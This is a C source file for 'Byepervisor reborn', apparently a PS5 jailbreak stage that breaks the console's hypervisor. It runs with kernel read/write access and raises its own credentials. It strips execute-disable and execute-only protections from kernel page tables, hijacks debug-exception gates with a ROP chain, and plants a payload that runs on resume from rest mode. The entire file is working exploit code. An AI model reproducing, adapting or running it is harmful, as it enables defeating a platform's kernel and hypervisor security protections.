#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/mman.h>

#include <ps5/kernel.h>
#include <sys/syscall.h>

#include "kdlsym.h"
#include "khook.h"
#include "util.h"
#include "paging.h"

uint64_t g_hv_base_pa;

#ifdef AP_DIAGNOSTIC_1270
#include "break_hv_payload/break_hv_diag.h"
#define AP_DIAG_DONE    0x415031323730444eULL
#define AP_DIAG_BAD_PA  0x4150313237304241ULL
#define AP_DIAG_CARRIER_PA 0x3FFFF000ULL
#ifdef AP_DIAG_PRESTAGE_1270
static uint8_t diag_carrier_page[0x1000];
static uint8_t diag_carrier_verify[0xF00];
static uint8_t diag_carrier_zero[0x1000];

static int clear_diag_carrier(uint64_t carrier)
{
  if (kwrite(carrier, diag_carrier_zero, sizeof(diag_carrier_zero)) != 0 ||
      kread(carrier, diag_carrier_page, sizeof(diag_carrier_page)) != 0 ||
      memcmp(diag_carrier_page, diag_carrier_zero,
             sizeof(diag_carrier_page)) != 0)
    return -1;
  return 0;
}

static int prestage_diag_carrier(uint64_t carrier, uint64_t oracle)
{
  if (kread(carrier, diag_carrier_page, sizeof(diag_carrier_page)) != 0)
    return -1;
  for (size_t i = 0; i < sizeof(diag_carrier_page); i++) {
    if (diag_carrier_page[i] != 0)
      return -2;
  }

  uint64_t params[6] = {
    kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR),
    kdldmap(0), oracle, g_hv_base_pa,
    g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE),
    g_hv_base_pa + rawoff(HV_SYM_PCPUS)
  };
  if (kwrite(carrier, break_hv, break_hv_len) != 0 ||
      kwrite(carrier + 0xF00, params, sizeof(params)) != 0) {
    clear_diag_carrier(carrier);
    return -3;
  }

  uint64_t params_verify[6] = {0};
  if (kread(carrier, diag_carrier_verify, break_hv_len) != 0 ||
      memcmp(diag_carrier_verify, break_hv, break_hv_len) != 0 ||
      kread(carrier + 0xF00, params_verify, sizeof(params_verify)) != 0 ||
      memcmp(params_verify, params, sizeof(params)) != 0) {
    clear_diag_carrier(carrier);
    return -4;
  }
  return 0;
}
#endif
#else
#include "break_hv_payload/break_hv.h"
#endif

#define STATE_ARMED               0x4B484F4F4B454401ULL // 'KHOOKED.'
#define COOKIE_VAL                0xCAFE133741414141ULL
#define HOOK_CORE                 0
#define HOOK_IST                  6
#define CAVE_STATE_OFF            0x600
#define CAVE_SAVE_OFF             0x620
#define TSS_STRIDE                0x68
#define STARTUP_MP_PAYLOAD_PAGE   0x3FFFF000

#define HV_LOADER_PA_REGULAR      0x062800000
#define HV_LOADER_PA_PRO          0x8e0800000

#ifdef AP_DIAGNOSTIC_1270
static int restore_diag_carrier(uint64_t pmap, uint64_t original)
{
  uint64_t current = 0, readback = 0;
  uint64_t entry_addr = find_pml4e(pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &current);
  if (entry_addr == UINT64_MAX)
    return -1;
  uint64_t volatile_flags = (1ULL << PDE_ACCESSED) | (1ULL << PDE_DIRTY);
  uint64_t nx = 1ULL << PDE_EXECUTE_DISABLE;
  if ((current ^ original) & ~(volatile_flags | nx))
    return -2;
  if (current & nx)
    return 0;
  uint64_t restored = current | nx;
  if (kwrite(entry_addr, &restored, 8) != 0 ||
      kread(entry_addr, &readback, 8) != 0 || readback != restored)
    return -3;
  return 0;
}
#endif

static int install_test_hook(int core_id, uint64_t cave)
{
  khook_t    hook;
  kh_chain_t chain;
  uint8_t    chain_buf[0x400];
  int        ret;

  printf("[+] install_test_hook addr = %p\n", &install_test_hook);

  ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret) return ret;

  hook.tss_stride      = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.oneshot   = 1;

  // kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xB);    // 8b4008             mov     eax, dword [rax+0x8]
  // kh_set_resume_rax(&hook, ktext(0x12F61C6));
  // kh_set_resume_skip(&hook, 3);
  // kh_set_resume_rip(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xB + 3); // skip ^^^

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE);       // 48898708040000     mov     qword [rdi+0x408], rax
  kh_set_resume_rax(&hook, 0x12345678);
  //kh_set_resume_skip(&hook, 7);
  //kh_set_resume_rip(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE + 7); // skip ^^^

  uint64_t oracle = kh_user_data_addr(&hook);
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  ret = kh_install(&hook, &chain);
  if (ret) return ret;

  ret = kh_trigger(&hook);
  if (ret != 0) {
    kh_restore(&hook);
    return ret;
  }

  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
  return 0;
}

static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
{
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x800];
  uint64_t set_rsi;
#ifndef AP_DIAG_PRESTAGE_1270
  uint64_t oracle;
#endif
  int ret;

  ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret) return ret;

  hook.tss_stride      = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.oneshot   = 1;

  set_rsi = kdldmap(STARTUP_MP_PAYLOAD_PAGE); // our payload
  // set_rsi = ktext(0x269FB8); // original vector (13.60)

  printf("[+] install_resume_hook: setting hook target = 0x%lx (base: 0x%lx), set rsi=0x%lx\n", kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL), ktext(0), set_rsi);
  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
  kh_set_resume_rsi(&hook, set_rsi);
  kh_set_resume_rdx(&hook, cr3);

  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
#ifndef AP_DIAG_PRESTAGE_1270
  oracle = kh_user_data_addr(&hook);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
  kh_chain_q(&chain, cr3);

  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(&chain, oracle + 0x08);
  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);

  kh_chain_memcpy(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE), kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, 0xF00);

  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF00), kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF08), kdldmap(0));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF10), oracle);

  // carveout addr
  if (g_hv_base_pa == HV_LOADER_PA_PRO)
    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa - 0x800000);
  else
    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa);

  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20), g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28), g_hv_base_pa + rawoff(HV_SYM_PCPUS));
#endif

  ret = kh_install(&hook, &chain);
  if (ret) return ret;

  if (kwrite(cave + CAVE_SAVE_OFF + 0x00, &hook.saved_gate_lo, 8) != 0 ||
      kwrite(cave + CAVE_SAVE_OFF + 0x08, &hook.saved_gate_hi, 8) != 0 ||
      kwrite(cave + CAVE_SAVE_OFF + 0x10, &hook.saved_ist, 8) != 0) {
    kh_restore(&hook);
    return -17;
  }
  uint64_t armed = STATE_ARMED;
  if (kwrite(cave + CAVE_STATE_OFF, &armed, 8) != 0) {
    kh_restore(&hook);
    return -18;
  }
  ret = kh_trigger(&hook);
  if (ret != 0) {
    uint64_t clear = 0;
    kwrite(cave + CAVE_STATE_OFF, &clear, 8);
    kh_restore(&hook);
    return ret;
  }
  return 0;
}

static int uninstall_hook(int core_id, uint64_t cave)
{
  khook_t hook;
  int ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret) return ret;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  if (kread(cave + CAVE_SAVE_OFF + 0x00, &hook.saved_gate_lo, 8) != 0 ||
      kread(cave + CAVE_SAVE_OFF + 0x08, &hook.saved_gate_hi, 8) != 0 ||
      kread(cave + CAVE_SAVE_OFF + 0x10, &hook.saved_ist, 8) != 0)
    return -4;
  hook.installed     = 1;
#ifndef AP_DIAGNOSTIC_1270
  ret = kh_disarm(&hook);
  if (ret) return ret;
#endif
  ret = kh_restore(&hook);
  if (ret) return ret;
  uint64_t clear = 0;
  return kwrite(cave + CAVE_STATE_OFF, &clear, 8);
}

int main(void)
{
#ifndef AP_DIAGNOSTIC_1270
  uint64_t test_val;
  uint8_t *test_val_bytes;
#endif

  uint32_t fw;
  uint64_t cave;
  uint64_t oracle;
  uint64_t kernel_pmap;
  uint64_t kernel_pm_cr3;
  uint64_t pml4e_addr;
  uint64_t pdpe_addr;
#ifndef AP_DIAGNOSTIC_1270
  uint64_t pte_addr;
#endif
  uint64_t pde_addr;
  uint64_t pml4e = 0;
  uint64_t pdpe = 0;
  uint64_t pde = 0;
#ifndef AP_DIAGNOSTIC_1270
  uint64_t pte = 0;
#endif
  uint64_t o = 0;
#ifdef AP_DIAGNOSTIC_1270
  uint64_t carrier_pml4e_saved = 0;
#endif

  printf("[+] Byepervisor reborn v1\n");

  // Do a quick firmware version detect, if we don't have offsets for it, goodbye!
  fw = kernel_get_fw_version();
  printf("[+] Detected firmware: %x.%x\n", (fw & 0xFF000000) >> 0x18, (fw & 0x00FF0000) >> 0x10);

#ifdef AP_DIAGNOSTIC_1270
  if ((fw & 0xffff0000U) != 0x12700000U) {
    printf("[!] AP diagnostic is only built for firmware 12.70\n");
    return 2;
  }
#ifndef AP_DIAG_PRESTAGE_1270
  // Confirmed on 12.70 hardware: both candidate pages are NX. The old
  // diagnostic panicked in the hook path, which uses POP_RDI to arm #DB.
  if (kgadget(KERNEL_GADGET_POP_RDI) == ktext(0xD65548ULL) ||
      kgadget(KERNEL_GADGET_CLD) == ktext(0x1226933ULL)) {
    printf("[!] 12.70 AP diagnostic disabled: candidate ROP gadget is NX\n");
    notifyf("12.70 AP diagnostic disabled: invalid gadget offsets");
    return 2;
  }
#endif
#else
  if ((fw & 0xffff0000U) == 0x12700000U) {
    printf("[!] 12.70 offsets are staged for review; HV path is disabled\n");
    notifyf("Byepervisor Reborn 12.70\nCandidate offsets staged; HV path disabled");
    return 2;
  }
#endif

  if (kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL) == 0) {
    printf("[!] Undetected firmware, exiting!\n");
    notifyf("[ERROR] Byepervisor Reborn\nFirmware is not supported :(\n");
    return 1;
  }

  // The hypervisor loader's base physical address changes depending on if its a regular or a pro unit
  int soc_id = sceKernelGetMainSocId();
#ifdef AP_DIAGNOSTIC_1270
  if (soc_id == 0x840fd0) {
    printf("[!] AP diagnostic supports only regular model\n");
    return 2;
  }
#endif
  if (soc_id == 0x840fd0) {
    g_hv_base_pa = HV_LOADER_PA_PRO;
    printf("[+] Pro model detected, HV loader PA = 0x%lx\n", g_hv_base_pa);
    notifyf("Byepervisor Reborn\nDetected pro model (0x%x)\n", soc_id);
  } else {
    g_hv_base_pa = HV_LOADER_PA_REGULAR;
    printf("[+] Regular model detected, HV loader PA = 0x%lx\n", g_hv_base_pa);
    notifyf("Byepervisor Reborn\nDetected regular model (0x%x)\n", soc_id);
  }

  // We need system ucred to pin to core 0
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);

  cave   = kdlsym(KERNEL_SYM_DATA_CAVE);
  oracle = cave + KH_OFF_USER;

#ifdef AP_DIAGNOSTIC_1270
  if (kread(oracle, &o, 8) != 0 || o != 0) {
    klog("P1270DIAG,1,stop,stage=oracle-not-clear,value=0x%016lx\n", o);
    return 3;
  }
  uint64_t cave_state = 0;
  if (kread(cave + CAVE_STATE_OFF, &cave_state, 8) != 0 || cave_state != 0) {
    klog("P1270DIAG,1,stop,stage=cave-state,value=0x%016lx\n", cave_state);
    return 3;
  }
#endif

  if (pin_to_core(HOOK_CORE) != 0) {
    printf("[!] Could not pin to hook core\n");
    return 3;
  }

  // This is so we can send the same payload after resume to experiment with post-HV hax (or not if we want to debug the resume payload)
#define DEBUG_MP_STARTUP_PAYLOAD 0
#if DEBUG_MP_STARTUP_PAYLOAD == 0
#ifndef AP_DIAGNOSTIC_1270
  if (kread64(oracle) != 0) {
    printf("Hypervisor is already compromised\n");
    printf("Here's a dump of kernel .text base (xotext defeated)!\n");
    kHexDump(ktext(0), 0x60);

    printf("Here's a dump of some HV strings (hvcore+0x19830)!\n");
    kHexDump(kdldmap(g_hv_base_pa + 0x72830), 0x60);

    test_val = kread64(ktext(0));
    test_val_bytes = (uint8_t *) &test_val;
    notifyf("Byepervisor - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);

    return 0;
  }
#endif
#endif

#if defined(KHOOK_TEST)
  int ret;

  ret = install_test_hook(HOOK_CORE, cave);
  printf("installed test khook = %d\n", ret);

  printf("1\n");
  sceKernelSleep(1);

  kwrite64(oracle, 0);
  printf("2\n");
  sceKernelSleep(1);

  pin_to_core(HOOK_CORE);
  printf("core = %d\n", get_cpu_core());

  ret = syscall(SYS_getuid);

  o = kread64(oracle);
  printf("test khook oracle=0x%lx (ret = 0x%x)\n", o, ret);
  kwrite64(oracle, 0);
  sceKernelSleep(1);

  ret = syscall(SYS_getuid);

  o = kread64(oracle);
  printf("test khook oracle=0x%lx (ret = 0x%x)\n", o, ret);

  sceKernelSleep(1);

  uninstall_hook(HOOK_CORE, cave);
  notifyf("uninstalled test khook\n");
  return 0;

#else // !KHOOK_TEST

#ifdef AP_DIAGNOSTIC_1270
  printf("P1270DIAG,1,start,fw=0x%08x,soc=0x%x\n", fw, soc_id);
  klog("P1270DIAG,1,start,fw=0x%08x,soc=0x%x\n", fw, soc_id);
  if (break_hv_len > 0xF00 || break_hv_len == 0) {
    klog("P1270DIAG,1,stop,stage=ap-image-size,len=%u\n", break_hv_len);
    return 3;
  }
  uint64_t diag_zeroes[3] = {0, 0, 0};
  if (kwrite(oracle + 8, diag_zeroes, sizeof(diag_zeroes)) != 0) {
    klog("P1270DIAG,1,stop,stage=oracle-init\n");
    return 3;
  }
#endif

#ifndef AP_DIAGNOSTIC_1270
  // Copy our payload that runs from startup_mp into kernel cave
  if (kwrite(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, break_hv, break_hv_len) != 0) {
    printf("[!] AP image copy failed\n");
    return 4;
  }
#endif

  // Make the physical region executable in guest page tables
  kernel_pmap   = kdlsym(KERNEL_SYM_PMAP_STORE);
  if (kread(kernel_pmap + 0x28, &kernel_pm_cr3, sizeof(kernel_pm_cr3)) != 0 ||
      kernel_pm_cr3 == 0 || (kernel_pm_cr3 & 0xfffULL)) {
    printf("[!] Kernel CR3 read failed\n");
    return 5;
  }

#ifdef AP_DIAGNOSTIC_1270
  pml4e_addr = find_pml4e(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pml4e);
  pdpe_addr = find_pdpe(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pdpe);
  pde_addr = find_pde(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pde);
  if (pml4e_addr == UINT64_MAX || pdpe_addr == UINT64_MAX ||
      pde_addr == UINT64_MAX || !PDE_FIELD(pml4e, PRESENT) ||
      !PDE_FIELD(pdpe, PRESENT) || !PDE_FIELD(pde, PRESENT) ||
      !PDE_FIELD(pml4e, EXECUTE_DISABLE) ||
      PDE_FIELD(pdpe, EXECUTE_DISABLE) || PDE_FIELD(pdpe, PS) ||
      PDE_FIELD(pde, EXECUTE_DISABLE) || !PDE_FIELD(pde, PS) ||
      (PDE_ADDR(pde) & ~0x1fffffULL) !=
          (AP_DIAG_CARRIER_PA & ~0x1fffffULL)) {
    klog("P1270DIAG,1,stop,stage=carrier-topology,pml4e=0x%016lx,pdpte=0x%016lx,pde=0x%016lx\n",
         pml4e, pdpe, pde);
    return 6;
  }
  uint64_t db_gate_lo = 0, db_gate_hi = 0, ist6 = 0;
  uint64_t db_gate = kdlsym(KERNEL_SYM_IDT_ARRAY) + 0x10;
  uint64_t tss_ist = kdlsym(KERNEL_SYM_COMMON_TSS) + 0x4c;
  if (kread(db_gate, &db_gate_lo, 8) != 0 ||
      kread(db_gate + 8, &db_gate_hi, 8) != 0 ||
      kread(tss_ist, &ist6, 8) != 0 ||
      ((db_gate_lo >> 47) & 1) != 1 ||
      ((db_gate_lo >> 40) & 0xf) != 0xe ||
      ((db_gate_lo >> 16) & 0xffff) != 0x20 ||
      ist6 != 0) {
    klog("P1270DIAG,1,stop,stage=hook-state,gate_lo=0x%016lx,gate_hi=0x%016lx,ist6=0x%016lx\n",
         db_gate_lo, db_gate_hi, ist6);
    return 6;
  }
#ifndef AP_DIAG_PRESTAGE_1270
  uint8_t copied_ap[0xF00] = {0};
  if (kwrite(cave + 0x1000, break_hv, break_hv_len) != 0 ||
      kread(cave + 0x1000, copied_ap, break_hv_len) != 0 ||
      memcmp(copied_ap, break_hv, break_hv_len) != 0) {
    klog("P1270DIAG,1,stop,stage=ap-image-copy\n");
    return 6;
  }
#else
  int stage_result = prestage_diag_carrier(kdldmap(STARTUP_MP_PAYLOAD_PAGE), oracle);
  if (stage_result != 0) {
    klog("P1270DIAG,1,stop,stage=carrier-prestage,result=%d\n", stage_result);
    return 6;
  }
  klog("P1270DIAG,1,carrier,prestage=1,bytes=%u\n", break_hv_len);
#endif
  carrier_pml4e_saved = pml4e;
  CLEAR_PDE_BIT(pml4e, EXECUTE_DISABLE);
  uint64_t carrier_readback = 0;
  if (kwrite(pml4e_addr, &pml4e, 8) != 0 ||
      kread(pml4e_addr, &carrier_readback, 8) != 0 ||
      carrier_readback != pml4e) {
    restore_diag_carrier(kernel_pmap, carrier_pml4e_saved);
#ifdef AP_DIAG_PRESTAGE_1270
    clear_diag_carrier(kdldmap(STARTUP_MP_PAYLOAD_PAGE));
#endif
    klog("P1270DIAG,1,stop,stage=carrier-write\n");
    return 7;
  }
  klog("P1270DIAG,1,carrier,prepared=1,leaf=2m,pml4e=0x%016lx\n", pml4e);
#else
  pml4e_addr = find_pml4e(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pml4e);
  CLEAR_PDE_BIT(pml4e, EXECUTE_DISABLE);
  if (kwrite(pml4e_addr, &pml4e, 8) != 0) return 7;

  pdpe_addr = find_pdpe(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pdpe);
  CLEAR_PDE_BIT(pdpe, EXECUTE_DISABLE);
  if (kwrite(pdpe_addr, &pdpe, 8) != 0) return 9;

  if (PDE_FIELD(pdpe, PS) != 1) {
    pde_addr = find_pde(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pde);
    CLEAR_PDE_BIT(pde, EXECUTE_DISABLE);
    if (kwrite(pde_addr, &pde, 8) != 0) return 11;

    if (PDE_FIELD(pde, PS) != 1) {
      pte_addr = find_pte(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pte);
      CLEAR_PDE_BIT(pte, EXECUTE_DISABLE);
      if (kwrite(pte_addr, &pte, 8) != 0) return 13;
    }
  }

  // Disable xotext + enable write on kernel .text pages
  printf("[+] Disabling xotext + enabling write...\n");
  for (uint64_t addr = ktext(0); addr < KERNEL_ADDRESS_DATA_BASE; addr += 0x1000) {
    pde_addr = find_pde(kernel_pmap, addr, &pde);
    if (pde_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pde, XOTEXT);
      SET_PDE_BIT(pde, RW);
      kwrite64(pde_addr, pde);
    }

    if (pde_addr != 0xFFFFFFFFFFFFFFFFull && !PDE_FIELD(pde, PS)) {
      pte_addr = find_pte(kernel_pmap, addr, &pte);
      if (pte_addr != 0xFFFFFFFFFFFFFFFFull) {
        CLEAR_PDE_BIT(pte, XOTEXT);
        SET_PDE_BIT(pte, RW);
        kwrite64(pte_addr, pte);
      }
    }
  }
#endif

  // Install hook on startup_mp hypercall
  printf("[+] Installing hook...\n");
  if (kread64(cave + CAVE_STATE_OFF) != STATE_ARMED) {
    int r = install_resume_hook(HOOK_CORE, cave, kernel_pm_cr3);
    if (r) {
      printf("[!] Failed to install hook (likely too large)\n");
      notifyf("[ERROR] Byepervisor Reborn\nHook install failed :(");
#ifdef AP_DIAGNOSTIC_1270
      int restore_result = restore_diag_carrier(kernel_pmap, carrier_pml4e_saved);
#ifdef AP_DIAG_PRESTAGE_1270
      int clear_result = clear_diag_carrier(kdldmap(STARTUP_MP_PAYLOAD_PAGE));
      klog("P1270DIAG,1,carrier,clear_after_install_failure=%d\n", clear_result);
#endif
      klog("P1270DIAG,1,stop,stage=hook-install,result=%d,carrier_restore=%d\n",
           r, restore_result);
#endif
      return r;
    }

#ifdef AP_DIAGNOSTIC_1270
    klog("P1270DIAG,1,ready,enter-rest-mode\n");
    notifyf("12.70 AP diagnostic ready\nEnter rest mode, then resume");
#else
    printf("[+] Hook installed, enter sleep and resume!\n");
    notifyf("Byepervisor Reborn\nEnter sleep and resume!\n");
#endif
  } else {
    printf("khook: hook already ARMED (state survived)\n");
  }

  // Poll for resume and hook trigger
#ifdef AP_DIAGNOSTIC_1270
  unsigned diag_pending = 0;
#endif
  for (;;) {
    pin_to_core(HOOK_CORE);

    o = kread64(oracle);
#ifdef AP_DIAGNOSTIC_1270
    if (o == AP_DIAG_DONE || o == AP_DIAG_BAD_PA) {
      uint64_t heap = 0, pcpus = 0, finished = 0;
      if (kread(oracle + 8, &heap, 8) != 0 ||
          kread(oracle + 16, &pcpus, 8) != 0 ||
          kread(oracle + 24, &finished, 8) != 0) {
        int hook_result = uninstall_hook(HOOK_CORE, cave);
        int carrier_result = restore_diag_carrier(kernel_pmap, carrier_pml4e_saved);
        klog("P1270DIAG,1,stop,stage=oracle-read,hook_restore=%d,carrier_restore=%d\n",
             hook_result, carrier_result);
        return 14;
      }
      klog("P1270DIAG,1,resume,marker=0x%016lx,heap=0x%016lx,pcpus=0x%016lx,finished=%lu\n",
           o, heap, pcpus, finished);
      notifyf("12.70 AP diagnostic returned\nheap=0x%lx pcpus=0x%lx", heap, pcpus);
      int restore_result = uninstall_hook(HOOK_CORE, cave);
      int carrier_result = restore_diag_carrier(kernel_pmap, carrier_pml4e_saved);
      if (restore_result != 0) {
        klog("P1270DIAG,1,stop,stage=hook-restore,result=%d\n", restore_result);
        return restore_result;
      }
      if (carrier_result != 0) {
        klog("P1270DIAG,1,stop,stage=carrier-restore,result=%d\n", carrier_result);
        return carrier_result;
      }
      if (o != AP_DIAG_DONE || finished != 15) {
        klog("P1270DIAG,1,stop,stage=ap-result,marker=0x%016lx,finished=%lu\n",
             o, finished);
        return 15;
      }
      klog("P1270DIAG,1,end,ok\n");
      return 0;
    }
    if (o != 0 && ++diag_pending >= 6) {
      uint64_t finished = kread64(oracle + 24);
      klog("P1270DIAG,1,stop,stage=ap-marker-timeout,marker=0x%016lx,finished=%lu\n",
           o, finished);
      int restore_result = uninstall_hook(HOOK_CORE, cave);
      int carrier_result = restore_diag_carrier(kernel_pmap, carrier_pml4e_saved);
      klog("P1270DIAG,1,restore,hook=%d,carrier=%d\n", restore_result, carrier_result);
      return 16;
    }
#else
    if (o != 0) {
      notifyf("Byepervisor Reborn\nWelcome back, hypervisor is defeated!\nCookie? 0x%lx", o);
      
      printf("[+] Uninstalling hook\n");
      uninstall_hook(HOOK_CORE, cave);

      test_val = kread64(ktext(0));
      test_val_bytes = (uint8_t *) &test_val;
      notifyf("Byepervisor Reborn - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);

      // TODO: Patch kernel and all that fun stuff, we don't feel like doing this so someone else can do it :)

      return 0;
    }
#endif

    sceKernelSleep(5);
  }
  return 0;
#endif
}
